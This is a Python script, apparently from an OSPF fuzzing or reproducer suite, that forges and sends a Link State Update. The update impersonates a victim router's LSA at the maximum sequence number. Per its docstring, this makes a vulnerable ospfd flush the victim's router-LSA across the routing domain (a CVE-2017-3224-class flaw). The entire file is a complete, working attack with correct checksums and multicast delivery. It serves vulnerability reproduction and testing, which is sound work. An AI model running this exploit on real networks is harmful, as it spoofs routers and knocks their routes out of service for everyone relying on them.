#!/usr/bin/env python3
# SPDX-License-Identifier: ISC
#
# inject_maxseq.py
#
# Copyright (c) 2026 Bing Shui <bingshui@smail.nju.edu.cn>
#
"""Send one forged LSU carrying a self-originated-style router-LSA at
MaxSequenceNumber, built byte-by-byte so every OSPF field (sequence number,
age, flags, source address, TTL) matches the manual reproducer
(topo-fuzz ospf_b2_maxseq_self_flush.py).

The LSA claims the victim's router-id as both LS ID and advertising router
with sequence number 0x7fffffff, age 1 and zero router links.  A vulnerable
ospfd adopts the sequence number, wraps its own LSA and flushes it
(RFC 2328 Section 14.1), suppressing the victim's router-LSA domain-wide
until MaxAge removal (CVE-2017-3224 class).
"""

import json
import socket
import struct
import sys

from scapy.all import Ether, IP, Raw, sendp


def internet_checksum(data):
    if len(data) % 2:
        data += b"\x00"
    total = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    total = (total & 0xFFFF) + (total >> 16)
    total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF


def fletcher_sums(data):
    c0 = 0
    c1 = 0
    for byte in data:
        c0 = (c0 + byte) % 255
        c1 = (c1 + c0) % 255
    return c0, c1


ifname, src_ip, src_mac, outer_rid, victim_rid = sys.argv[1:]
lsa = bytearray(
    struct.pack(
        "!HBB4s4sIHHBBH",
        1,
        0x02,
        1,
        socket.inet_aton(victim_rid),
        socket.inet_aton(victim_rid),
        0x7FFFFFFF,
        0,
        24,
        0,
        0,
        0,
    )
)
checksummed = bytearray(lsa[2:])
c0, c1 = fletcher_sums(checksummed)
x = ((len(checksummed) - 14 - 1) * c0 - c1) % 255
if x == 0:
    x = 255
y = 510 - c0 - x
if y > 255:
    y -= 255
lsa[16:18] = bytes((x, y))
assert fletcher_sums(lsa[2:]) == (0, 0)

ospf = bytearray(
    struct.pack(
        "!BBH4s4sHH8sI",
        2,
        4,
        28 + len(lsa),
        socket.inet_aton(outer_rid),
        socket.inet_aton("0.0.0.0"),
        0,
        0,
        b"\x00" * 8,
        1,
    )
    + lsa
)
struct.pack_into("!H", ospf, 12, internet_checksum(bytes(ospf)))
assert internet_checksum(bytes(ospf)) == 0

packet = (
    Ether(src=src_mac, dst="01:00:5e:00:00:06")
    / IP(src=src_ip, dst="224.0.0.6", proto=89, ttl=1)
    / Raw(load=bytes(ospf))
)
sendp(packet, iface=ifname, verbose=0)
print(
    json.dumps(
        {
            "sent": 1,
            "interface": ifname,
            "ip_src": src_ip,
            "ip_dst": "224.0.0.6",
            "ip_proto": 89,
            "outer_router_id": outer_rid,
            "area": "0.0.0.0",
            "ospf_type": 4,
            "ospf_length": len(ospf),
            "ospf_checksum": "0x%04x" % struct.unpack_from("!H", ospf, 12)[0],
            "lsa_type": 1,
            "lsa_id": victim_rid,
            "adv_router": victim_rid,
            "lsa_age": 1,
            "lsa_seq": "0x7fffffff",
            "lsa_length": len(lsa),
            "lsa_checksum": "0x%04x" % struct.unpack_from("!H", lsa, 16)[0],
            "router_links": 0,
            "ospf_hex": bytes(ospf).hex(),
        },
        sort_keys=True,
    )
)
